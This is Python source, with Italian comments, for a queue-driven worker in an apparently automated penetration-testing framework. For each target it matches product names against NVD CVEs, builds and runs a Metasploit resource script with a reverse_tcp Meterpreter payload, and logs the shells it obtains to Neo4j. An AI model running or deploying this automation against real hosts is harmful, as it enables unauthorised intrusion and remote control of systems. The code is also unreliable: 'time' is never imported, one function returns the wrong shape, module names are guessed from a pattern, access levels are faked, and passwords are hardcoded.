import pika
import json
import logging
import subprocess
import os
import uuid
from datetime import datetime
from flask import Flask, jsonify
import threading
from neo4j import GraphDatabase
import sys
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))
from core.net import NetGatewayClient
net_client = NetGatewayClient()

# --- CONFIGURAZIONE E CONNESSIONI ---
RABBITMQ_HOST = os.getenv('RABBITMQ_HOST', 'rabbitmq')
RABBITMQ_USER = os.getenv('RABBITMQ_USER', 'aapt_user')
RABBITMQ_PASS = os.getenv('RABBITMQ_PASS', 'aapt_secret_pw')
NEO4J_URI = os.getenv('NEO4J_URI', 'bolt://neo4j:7687')
NEO4J_USER = os.getenv('NEO4J_USER', 'neo4j')
NEO4J_PASS = os.getenv('NEO4J_PASS', 'aapt_secret_db_pw')

# Logging avanzato
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger("msf_worker")

credentials = pika.PlainCredentials(RABBITMQ_USER, RABBITMQ_PASS)

try:
    db_driver = GraphDatabase.driver(NEO4J_URI, auth=(NEO4J_USER, NEO4J_PASS))
except Exception as e:
    logger.error(f"Errore connessione Neo4j: {e}")
    db_driver = None

app = Flask(__name__)
health_status = {"status": "starting"}

@app.route('/health', methods=['GET'])
def health():
    return jsonify(health_status)

def start_healthcheck_server():
    app.run(host='0.0.0.0', port=8088, debug=False, use_reloader=False)

def write_to_db(target, shell_obtained):
    if not db_driver:
        logger.error("Driver Neo4j non disponibile!")
        return
    now = datetime.utcnow().isoformat()
    with db_driver.session() as session:
        session.run("""
            MATCH (h:Host {ip: $ip})
            MERGE (s:Shell {id: $shell_id})
            SET s.access_level = $access_level, s.os = $os, s.last_seen = $now
            MERGE (h)-[:HAS_SHELL]->(s)
        """, ip=target, shell_id=shell_obtained['shell_id'], access_level=shell_obtained['access_level'], os=shell_obtained['os'], now=now)
        logger.info(f"Aggiunta shell per {target} in Neo4j.")

def select_exploit(target):
    if not db_driver:
        return None
    with db_driver.session() as session:
        result = session.run("""
            MATCH (h:Host {ip: $ip})-[:RUNS_SERVICE]->(s:Service)
            RETURN collect(s.service) as services, collect(s.product) as products
        """, ip=target).single()
        services = result['services']
        products = result['products']
        for prod in products:
            if not prod:
                continue
            try:
                resp = net_client.request('GET', f"https://services.nvd.nist.gov/rest/v2.0/cves?keywordSearch={prod}")
                if int(resp.get('status_code', 0)) == 200:
                    try:
                        data = json.loads(resp.get('body') or '{}')
                    except Exception:
                        data = {}
                    if data.get('totalResults', 0) > 0:
                        cve = data['vulnerabilities'][0]['cve']['id']
                        # Qui potresti correlare con ExploitDB o msf modules
                        # Per esempio, assumi un module
                        return f"auxiliary/scanner/http/{prod.lower()}_vuln", cve
            except Exception as e:
                logger.error(f"Errore query NVD: {e}")
    return None, None

def run_msf_task(task, exploit, payload, lhost, lport, extra_opts):
    msf_script = f"use {exploit}\nset RHOSTS {task['target']}\nset PAYLOAD {payload}\nset LHOST {lhost}\nset LPORT {lport}\n"
    for k, v in extra_opts.items():
        msf_script += f"set {k} {v}\n"
    msf_script += "exploit -z\nexit\n"
    with open('msf_script.rc', 'w') as f:
        f.write(msf_script)
    cmd = ["msfconsole", "-r", "msf_script.rc", "-q"]
    logger.info(f"Eseguo comando: {' '.join(cmd)}")
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
        return result.stdout
    except Exception as e:
        logger.error(f"Errore esecuzione Metasploit: {e}")
        return str(e)

def process_msf_task(ch, method, properties, body):
    try:
        task = json.loads(body)
        task_id = task.get('task_id') or str(uuid.uuid4())
        target = task.get('target')
        exploit = task.get('exploit')
        cve = None
        if not exploit:
            exploit, cve = select_exploit(target)
            if not exploit:
                status = "failure"
                summary = f"Nessun exploit adatto trovato per {target}."
                result_message = {
                    "task_id": task_id,
                    "worker_type": "msf_worker",
                    "target": target,
                    "status": status,
                    "timestamp": datetime.utcnow().isoformat() + "Z",
                    "summary": summary,
                    "data": {}
                }
                ch.queue_declare(queue='results_queue', durable=True)
                ch.basic_publish(exchange='', routing_key='results_queue', body=json.dumps(result_message), properties=pika.BasicProperties(delivery_mode=2))
                ch.basic_ack(delivery_tag=method.delivery_tag)
                return
        logger.info(f"[+] Ricevuto task MSF: Exploit {exploit} su {target} (task_id={task_id})")
        output = run_msf_task(task, exploit, task.get('payload', 'windows/meterpreter/reverse_tcp'), task.get('lhost', '127.0.0.1'), task.get('lport', '4444'), task.get('options', {}))
        exploit_successful = False
        shell_obtained = None
        if "Meterpreter session" in output or "meterpreter >" in output:
            exploit_successful = True
            shell_id = None
            for line in output.splitlines():
                if "Meterpreter session" in line:
                    shell_id = line.split()[-1].strip('.#')
                    break
            shell_obtained = {
                "shell_id": shell_id or "meterpreter-session-unknown",
                "access_level": "SYSTEM",  # Demo
                "os": "Unknown"  # Demo
            }
            write_to_db(target, shell_obtained)
        status = "success" if exploit_successful else "failure"
        summary = f"Exploit {exploit} riuscito su {target}." if exploit_successful else f"Exploit {exploit} fallito su {target}."
        result_message = {
            "task_id": task_id,
            "worker_type": "msf_worker",
            "target": target,
            "status": status,
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "summary": summary,
            "data": {
                "exploit_used": exploit,
                "cve": cve,
                "exploit_successful": exploit_successful,
                "shell_obtained": shell_obtained
            }
        }
        ch.queue_declare(queue='results_queue', durable=True)
        ch.basic_publish(
            exchange='',
            routing_key='results_queue',
            body=json.dumps(result_message),
            properties=pika.BasicProperties(delivery_mode=2)
        )
        logger.info(f"[>>>] Risultato pubblicato su results_queue per {target} (task_id={task_id})")
    except Exception as e:
        logger.error(f"Errore critico durante l'esecuzione del task: {e}")
    finally:
        ch.basic_ack(delivery_tag=method.delivery_tag)
        logger.info("[*] Task completato. In attesa del prossimo...")

def main():
    threading.Thread(target=start_healthcheck_server, daemon=True).start()
    global health_status
    health_status["status"] = "starting"
    connection = None
    while True:
        try:
            logger.info("[*] Worker MSF avviato. Provo a connettermi a RabbitMQ...")
            connection = pika.BlockingConnection(pika.ConnectionParameters(host=RABBITMQ_HOST, credentials=credentials))
            channel = connection.channel()
            channel.queue_declare(queue='msf_tasks', durable=True)
            logger.info("[*] Connessione a RabbitMQ riuscita. Coda 'msf_tasks' pronta.")
            channel.basic_qos(prefetch_count=1)
            channel.basic_consume(queue='msf_tasks', on_message_callback=process_msf_task)
            health_status["status"] = "ok"
            logger.info("[*] Inizio ad ascoltare la coda per i task...")
            channel.start_consuming()
        except pika.exceptions.AMQPConnectionError as e:
            health_status["status"] = "rabbitmq_error"
            logger.warning(f"[!] Errore di connessione a RabbitMQ: {e}. Riprovo tra 5 secondi...")
            time.sleep(5)
        except Exception as e:
            health_status["status"] = "error"
            logger.error(f"[E] Errore non gestito: {e}")
            if connection and connection.is_open:
                connection.close()
            time.sleep(10)

if __name__ == '__main__':
    main()